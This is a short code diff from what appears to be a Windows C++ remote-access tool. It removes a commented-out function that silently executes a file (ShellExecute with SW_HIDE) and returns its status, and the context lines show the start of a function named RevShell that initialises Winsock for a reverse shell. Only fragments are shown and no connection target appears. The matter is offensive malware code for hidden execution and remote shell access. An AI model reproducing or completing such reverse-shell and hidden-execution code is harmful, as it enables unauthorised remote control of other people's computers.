@@ -11,18 +11,6 @@
 // Debug headers
 #include <iostream>
 
-// void exec(char* returnval, int returnsize, char *lx3fl3e)
-// {
-//     if (32 >= (int)(ShellExecute(NULL,"open", lx3fl3e, NULL, NULL, SW_HIDE))) //Get return value in int
-//     {
-//         strcat(returnval, "[x] Error executing file..\n");
-//     }
-//     else
-//     {
-//         strcat(returnval, "\n");
-//     }
-// }
-
 void RevShell()
 {
     WSADATA wsaver;
